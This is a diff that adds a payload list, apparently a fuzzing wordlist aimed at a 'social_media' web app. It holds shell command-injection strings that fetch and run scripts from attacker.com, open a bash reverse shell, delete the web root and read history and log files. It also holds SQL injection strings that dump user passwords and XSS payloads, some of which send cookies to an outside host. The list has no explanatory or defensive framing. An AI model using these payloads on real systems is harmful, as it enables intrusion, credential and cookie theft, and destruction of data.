@@ -1,0 +1,150 @@
+; ls
+| ls
+&& ls
+`ls`
+; cat /var/www/social_media/.bash_history
+| cat /var/www/social_media/.bash_history
+&& cat /var/www/social_media/.bash_history
+`cat /var/www/social_media/.bash_history`
+; id
+| id
+&& id
+`id`
+; whoami
+| whoami
+&& whoami
+`whoami`
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+`ping -c 4 127.0.0.1`
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+; nc -lvp 1234
+| nc -lvp 1234
+&& nc -lvp 1234
+`nc -lvp 1234`
+; curl http://attacker.com/malicious_script.sh | sh
+| curl http://attacker.com/malicious_script.sh | sh
+&& curl http://attacker.com/malicious_script.sh | sh
+`curl http://attacker.com/malicious_script.sh | sh`
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+| wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+&& wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+`wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh`
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+| echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+&& echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+`echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh`
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+| bash -i >& /dev/tcp/attacker.com/1234 0>&1
+&& bash -i >& /dev/tcp/attacker.com/1234 0>&1
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+; rm -rf /var/www/social_media/*
+| rm -rf /var/www/social_media/*
+&& rm -rf /var/www/social_media/*
+`rm -rf /var/www/social_media/*`
+; cat /var/log/apache2/access.log
+| cat /var/log/apache2/access.log
+OR '1'='1
+OR 'a'='a'
+OR 1=1 LIMIT 1 --
+OR 1=1 --
+OR 1=1# 
+AND 1=1 --
+AND 'a'='a' --
+UNION SELECT username, password FROM users --
+UNION SELECT NULL, username, password FROM users --
+' UNION SELECT null, null, database() --
+' UNION SELECT null, null, version() --
+' UNION SELECT null, table_name FROM information_schema.tables --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+' AND 1=1 HAVING 1=1 --
+' AND 1=1 ORDER BY 1 --
+' UNION SELECT 1,2,3,4 --
+' UNION SELECT 1,2,3,4,5 --
+' UNION SELECT null, username, email FROM users --
+' UNION SELECT null, username, password, email FROM users --
+' AND 1=1 GROUP BY NULL --
+' AND 1=1 HAVING 1=1 --
+' OR '1'='1' LIMIT 0,1 --
+' AND 1=1 --+
+' AND username='admin' AND password='password' --
+' OR 'a'='a' AND 1=1 --
+' OR 1=1 AND SLEEP(5) --
+' OR 1=1 --+
+' AND 1=1 GROUP BY username, password --
+' AND '1'='1' UNION SELECT username, password FROM users --
+' UNION SELECT username, password FROM users --
+' OR 1=1 AND SELECT database() --
+' OR 1=1 AND SELECT user() --
+' OR 1=1 AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT null, group_concat(username, ':', password) FROM users --
+' UNION SELECT null, group_concat(username) FROM users --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' OR (SELECT COUNT(*) FROM posts) > 1 --
+' AND 1=1 AND SLEEP(10) --
+' OR 'a'='a' AND SELECT username, password FROM users --
+' OR 'x'='x' AND SELECT * FROM users WHERE username='admin' --
+' AND 1=1 ORDER BY 1,2 --
+' OR (SELECT user()) FROM dual --
+' OR '1'='1' -- (test for login)
+' UNION SELECT NULL, user(), password FROM users --
+' OR (SELECT COUNT(*) FROM users WHERE username='guest') > 0 --
+' UNION SELECT null, email, password FROM users --
+' UNION SELECT null, username, COUNT(*) FROM posts WHERE user_id=1 --
+' OR 'a'='a' AND SELECT group_concat(username) FROM users --
+' UNION SELECT 1,2,3 FROM information_schema.tables --
+' UNION SELECT NULL, username, user_id FROM users WHERE user_id=1 --
+<script>alert('XSS in Social Media')</script>
+<img src="x" onerror="alert('XSS in Social Media')">
+<a href="javascript:alert('XSS in Social Media')">Click me</a>
+<div onmouseover="alert('XSS in Social Media')">Hover over me</div>
+<script>eval('alert("XSS in Social Media")')</script>
+<input type="text" value="<script>alert('XSS in Social Media')</script>">
+<iframe src="javascript:alert('XSS in Social Media');"></iframe>
+<svg/onload=alert('XSS in Social Media')>
+<script>document.location='javascript:alert("XSS in Social Media")'</script>
+<script>window.location="javascript:alert('XSS in Social Media')"</script>
+<form action="javascript:alert('XSS in Social Media')"></form>
+<img src="invalid" onerror="alert('XSS in Social Media')">
+<input type="button" value="Click me" onclick="alert('XSS in Social Media')">
+<button onclick="alert('XSS in Social Media')">Click me</button>
+<textarea onfocus="alert('XSS in Social Media')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS in Social Media')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Social Media')">
+<object data="javascript:alert('XSS in Social Media')"></object>
+<audio src="javascript:alert('XSS in Social Media')"></audio>
+<input type="image" src="x" onerror="alert('XSS in Social Media')">
+<script>setTimeout('alert("XSS in Social Media")', 100)</script>
+<script>window.alert('XSS in Social Media');</script>
+<input type="file" onchange="alert('XSS in Social Media')">
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<div style="width: expression(alert('XSS in Social Media'));">
+<script>window.alert(document.cookie)</script>
+<script>document.cookie="SocialMediaXSS=" + encodeURIComponent('test');</script>
+<script>new Image().src='javascript:alert("XSS in Social Media")'</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Social Media")>';</script>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Social Media\')"></iframe>';</script>
+<input onfocus="alert('XSS in Social Media')" autofocus>
+<video onplay="alert('XSS in Social Media')"></video>
+<form action="javascript:alert('XSS in Social Media')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS in Social Media')"></textarea>
+<script>var x = document.createElement('script'); x.src = 'javascript:alert("XSS in Social Media")'; document.body.appendChild(x);</script>
+<script>eval('alert("XSS in Social Media")')</script>
+<input type="text" value="SocialMedia <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
+<style>@import 'javascript:alert(2)';</style>
+<button onclick="location='javascript:alert(3)'">Click Me</button>
+<form action="javascript:alert('XSS in Social Media')" method="POST"></form>
+<audio controls autoplay><source src="javascript:alert('XSS in Social Media')"></audio>
+<script>document.body.innerHTML = '<img src="x" onerror="alert(\'XSS\')">';</script>
+<script>location='javascript:alert("XSS in Social Media")'</script>
+<script>window.location="javascript:alert('XSS in Social Media')"</script>
+<input type="text" value="<svg><script>alert('XSS in Social Media')</script></svg>">
+<script>window.alert('XSS in Social Media')</script>
